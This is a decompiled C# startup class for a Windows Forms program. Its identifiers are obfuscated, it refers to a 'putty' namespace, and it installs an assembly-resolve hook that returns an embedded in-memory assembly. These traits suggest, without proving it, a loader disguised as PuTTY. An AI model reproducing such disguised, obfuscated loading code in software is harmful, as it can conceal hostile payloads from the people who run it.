using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.ApplicationServices;
using putty;

namespace ns0;

[GeneratedCode("MyTemplate", "8.0.0.0")]
[EditorBrowsable(EditorBrowsableState.Never)]
internal sealed class Form0 : WindowsFormsApplicationBase
{
	[AccessedThroughProperty("maene")]
	private AppDomain appDomain_0;

	private virtual AppDomain AppDomain_0
	{
		get
		{
			return appDomain_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			ResolveEventHandler value2 = AppDomain_0_AssemblyResolve;
			if (appDomain_0 != null)
			{
				appDomain_0.AssemblyResolve -= value2;
			}
			appDomain_0 = value;
			if (appDomain_0 != null)
			{
				appDomain_0.AssemblyResolve += value2;
			}
		}
	}

	[DebuggerStepThrough]
	public Form0()
		: base((AuthenticationMode)0)
	{
		AppDomain_0 = AppDomain.CurrentDomain;
		((WindowsFormsApplicationBase)this).set_IsSingleInstance(false);
		((WindowsFormsApplicationBase)this).set_EnableVisualStyles(true);
		((WindowsFormsApplicationBase)this).set_SaveMySettingsOnExit(true);
		((WindowsFormsApplicationBase)this).set_ShutdownStyle((ShutdownMode)0);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	[DebuggerHidden]
	[STAThread]
	internal static void Main(string[] args)
	{
		try
		{
			Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.get_UseCompatibleTextRendering());
		}
		finally
		{
		}
		((WindowsFormsApplicationBase)Class1.Form0_0).Run(args);
	}

	private Assembly AppDomain_0_AssemblyResolve(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		if (resolveEventArgs_0.Name.Contains("x"))
		{
			return GClass0.om;
		}
		return null;
	}

	[DebuggerStepThrough]
	protected override void OnCreateMainForm()
	{
		((WindowsFormsApplicationBase)this).set_MainForm((Form)(object)Class1.Class2_0.Puty_0);
	}
}
